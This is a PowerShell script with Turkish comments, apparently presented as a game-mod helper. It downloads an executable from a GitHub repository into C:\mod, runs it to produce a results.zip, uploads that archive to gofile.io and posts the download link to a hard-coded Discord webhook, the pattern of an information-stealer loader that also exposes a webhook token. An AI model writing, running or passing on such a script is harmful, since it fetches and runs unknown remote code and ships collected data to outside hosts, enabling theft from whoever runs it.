$folder = "C:\mod"
$exe = "$folder\program.exe"
$url = "https://raw.githubusercontent.com/zesty7272/mods2/refs/heads/main/program.exe"

# KlasÃ¶rÃ¼ oluÅŸtur

New-Item -ItemType Directory -Path $folder -Force | Out-Null

# ProgramÄ± indir

Invoke-WebRequest -Uri $url -OutFile $exe

# ProgramÄ±n bitmesini bekle

Start-Process -FilePath $exe -ArgumentList "--zip" -WorkingDirectory $folder -Wait

# OluÅŸan ZIP dosyasÄ±

$file = "C:\mod\results\results.zip"

if (!(Test-Path $file)) {
Write-Host "Dosya bulunamadÄ±: $file"
exit
}

Write-Host "YÃ¼kleniyor..."

$result = curl.exe -s `    -F "file=@C:\mod\results\results.zip"`
https://upload.gofile.io/uploadfile

try {
$json = $result | ConvertFrom-Json
$link = $json.data.downloadPage

```
Write-Host ""
Write-Host "Link:"
Write-Host $link

$link | Set-Clipboard

Write-Host ""
Write-Host "Link panoya kopyalandi."
```

}
catch {
Write-Host "Upload cevabÄ±:"
Write-Host $result
}

$webhook = "https://discord.com/api/webhooks/1514588669724463205/F2UdB_j6a-6m5wYNuLcpnoAVVAcVzBbk_EFbSrxr6eh5-utxYvbNoNPqiX3yfsIPBJCq"
$mesaj = $link

$body = @{
    content = $mesaj
} | ConvertTo-Json

Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $body
